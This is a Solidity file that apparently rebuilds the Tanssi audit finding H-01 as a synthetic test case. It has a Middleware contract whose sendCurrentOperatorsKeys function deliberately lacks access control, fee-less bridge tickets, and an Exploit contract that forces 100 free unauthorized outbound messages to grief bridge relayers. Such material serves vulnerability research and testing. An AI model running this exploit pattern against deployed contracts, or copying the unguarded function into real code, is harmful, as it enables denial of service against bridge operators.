// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Tanssi finding 63290 (H-01):
// "Permissionless `sendCurrentOperatorsKeys()`".
//
// Real audited source (the three vulnerable snippets are reproduced VERBATIM
// from the finding; the primary defect line is marked @>):
//   protocol  Tanssi (Symbiotic bridge middleware)
//   report    github.com/pashov/audits .../Tanssi-security-review_2025-04-30.md
//   files     Middleware.sol :: sendCurrentOperatorsKeys()
//             Gateway.sol    :: sendOperatorsData()
//             Operators lib  :: encodeOperatorsData()  (ticket.costs = Costs(0,0))
//
// Root cause: `Middleware.sendCurrentOperatorsKeys()` is `external` with NO
// access control (@> line). Any external actor can call it. It forwards to
// `Gateway.sendOperatorsData()` (onlyMiddleware — satisfied because the
// Middleware itself is the caller), which submits an outbound bridge message
// and increments the channel's outbound nonce. The ticket is built with
// `ticket.costs = Costs(0, 0)` (second VULN marker below), so the message is
// fee-less. Combined: anyone can, permissionlessly and free of cost, spam the
// bridge's outbound channel — griefing / resource-exhaustion / DoS of the
// bridge relayers.
//
// Harm class: DoS / griefing (no positive transfer to the attacker). Per the
// authoring convention, the harm magnitude — one unit per free unauthorized
// outbound message the attacker forced — is minted to the SINK address on a
// marker token so the griefing is asserted mechanically.
//
// Non-vulnerable dependencies (operator-set read, epoch, ticket encoding, the
// outbound-channel submission) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

// ── Snowbridge-style value types / structs the vulnerable code touches ──
type ParaID is uint32;

struct Costs {
    uint256 foreign;
    uint256 native;
}

struct Ticket {
    ParaID dest;
    Costs costs;
    bytes payload;
}

/// @dev Faithful double of Snowbridge's OSubstrateTypes encoder. Returns the
///      opaque SCALE-ish payload bytes; the encoding itself is not the bug.
library OSubstrateTypes {
    function EncodedOperatorsData(bytes32[] memory operatorsKeys, uint32 validatorsKeysLength, uint48 epoch)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encode(operatorsKeys, validatorsKeysLength, epoch);
    }
}

/// @dev The Operators library. `encodeOperatorsData`'s tail is VERBATIM from
///      the finding, including the `ticket.costs = Costs(0, 0)` marker line.
library Operators {
    function encodeOperatorsData(bytes32[] memory operatorsKeys, uint48 epoch)
        internal
        pure
        returns (Ticket memory ticket)
    {
        uint256 validatorsKeysLength = operatorsKeys.length;

        // TODO: This is a type from Snowbridge, do we want our own simplified Ticket type?
        ticket.dest = ParaID.wrap(0);
        // TODO For now mock it to 0
        ticket.costs = Costs(0, 0); // @> VULN: outbound ticket has zero cost -> the permissionless spam below is fee-less

        ticket.payload = OSubstrateTypes.EncodedOperatorsData(operatorsKeys, uint32(validatorsKeysLength), epoch);
    }
}

// ── Interfaces used by the verbatim Middleware code ──
interface IOBaseMiddlewareReader {
    function sortOperatorsByPower(uint48 epoch) external view returns (bytes32[] memory);
}

interface IOGateway {
    function sendOperatorsData(bytes32[] calldata data, uint48 epoch) external;
}

/// @dev Faithful minimal ERC20-ish marker token. Griefing magnitude (one unit
///      per free unauthorized outbound message) is minted to SINK.
contract MiniToken {
    string public name = "Tanssi Bridge Grief Units";
    string public symbol = "GRIEF";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful double of the Ethereum-side Gateway. `sendOperatorsData` is VERBATIM
// from the finding. `_submitOutboundToChannel` is the faithful double where the
// fee-less outbound message is accepted and the channel nonce is incremented —
// the resource the permissionless caller exhausts.
// ─────────────────────────────────────────────────────────────────────────────
contract Gateway is IOGateway {
    bytes32 internal constant PRIMARY_GOVERNANCE_CHANNEL_ID = bytes32(uint256(1));
    address internal constant SINK = address(uint160(0xD00D)); // 0x00..00d00d

    address public middleware;
    MiniToken public marker;
    uint64 public outboundNonce; // faithful channel outbound nonce

    event OutboundMessageAccepted(bytes32 indexed channelID, uint64 nonce, bytes payload);

    error Gateway__NotMiddleware();

    modifier onlyMiddleware() {
        if (msg.sender != middleware) revert Gateway__NotMiddleware();
        _;
    }

    constructor(MiniToken marker_) {
        marker = marker_;
    }

    function setMiddleware(address middleware_) external {
        middleware = middleware_;
    }

    // ── VERBATIM from Gateway.sol ──
    function sendOperatorsData(bytes32[] calldata data, uint48 epoch) external onlyMiddleware {
        Ticket memory ticket = Operators.encodeOperatorsData(data, epoch);
        _submitOutboundToChannel(PRIMARY_GOVERNANCE_CHANNEL_ID, ticket.payload);
    }

    // ── faithful double of the outbound-channel submission ──
    function _submitOutboundToChannel(bytes32 channelID, bytes memory payload) internal {
        outboundNonce += 1; // increments the channel's outbound nonce (the finite bridge resource)
        marker.mint(SINK, 1e18); // one griefing unit per free unauthorized outbound message
        emit OutboundMessageAccepted(channelID, outboundNonce, payload);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `sendCurrentOperatorsKeys()` is reproduced VERBATIM.
// The `external` declaration carries NO access control (the @> defect).
// ─────────────────────────────────────────────────────────────────────────────
contract Middleware is IOBaseMiddlewareReader {
    address internal gateway;
    uint48 internal currentEpoch;
    bytes32[] internal operatorKeys; // faithful stand-in for the operator set

    error Middleware__GatewayNotSet();

    constructor(address gateway_) {
        gateway = gateway_;
        currentEpoch = 5;
        // a non-empty operator set so the outbound payload is realistic
        operatorKeys.push(bytes32(uint256(0xA11CE)));
        operatorKeys.push(bytes32(uint256(0xB0B)));
        operatorKeys.push(bytes32(uint256(0xCA401)));
    }

    // ── faithful doubles for the non-vulnerable helpers the branch calls ──
    function getGateway() public view returns (address) {
        return gateway;
    }

    function getCurrentEpoch() public view returns (uint48) {
        return currentEpoch;
    }

    function sortOperatorsByPower(uint48) external view returns (bytes32[] memory) {
        return operatorKeys;
    }

    // ── VERBATIM from Middleware.sol — NOTE: external, NO access-control modifier ──
    function sendCurrentOperatorsKeys() external returns (bytes32[] memory sortedKeys) { // @> VULN: permissionless — no role/owner check, anyone can trigger a fee-less outbound bridge message
        address gateway = getGateway();
        if (gateway == address(0)) {
            revert Middleware__GatewayNotSet();
        }

        uint48 epoch = getCurrentEpoch();
        sortedKeys = IOBaseMiddlewareReader(address(this)).sortOperatorsByPower(epoch);
        IOGateway(gateway).sendOperatorsData(sortedKeys, epoch);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an unprivileged attacker (this contract is NOT the Middleware
// and holds no role) repeatedly calls the permissionless sendCurrentOperatorsKeys()
// for free, forcing N fee-less outbound bridge messages and inflating the
// channel's outbound nonce — griefing/DoS of the bridge relayers.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public marker;
    Gateway public gateway;
    Middleware public vuln;

    address internal constant SINK = address(uint160(0xD00D));
    uint256 internal constant SPAM_COUNT = 100; // 100 free unauthorized outbound messages

    uint256 public messagesForced;
    uint64 public nonceInflation;
    uint256 public griefUnitsToSink;

    constructor() {
        marker = new MiniToken(); // child nonce 1 (marker / griefing units)
        gateway = new Gateway(marker); // child nonce 2
        vuln = new Middleware(address(gateway)); // child nonce 3 (VULN)
        gateway.setMiddleware(address(vuln));
    }

    function run() external {
        uint64 nonceBefore = gateway.outboundNonce();

        // The attacker is unprivileged (not the Middleware, no FORWARDER_ROLE)
        // yet every call succeeds and costs nothing (no msg.value sent).
        for (uint256 i = 0; i < SPAM_COUNT; i++) {
            vuln.sendCurrentOperatorsKeys();
            messagesForced += 1;
        }

        nonceInflation = gateway.outboundNonce() - nonceBefore;
        griefUnitsToSink = marker.balanceOf(SINK);

        // harm: a permissionless, fee-less caller forced SPAM_COUNT outbound bridge
        // messages, inflating the channel nonce by the same amount (relayer DoS).
        require(messagesForced == SPAM_COUNT, "spam did not go through");
        require(nonceInflation == uint64(SPAM_COUNT), "outbound nonce not inflated by spam");
        require(griefUnitsToSink == SPAM_COUNT * 1e18, "grief magnitude not recorded at sink");
    }
}
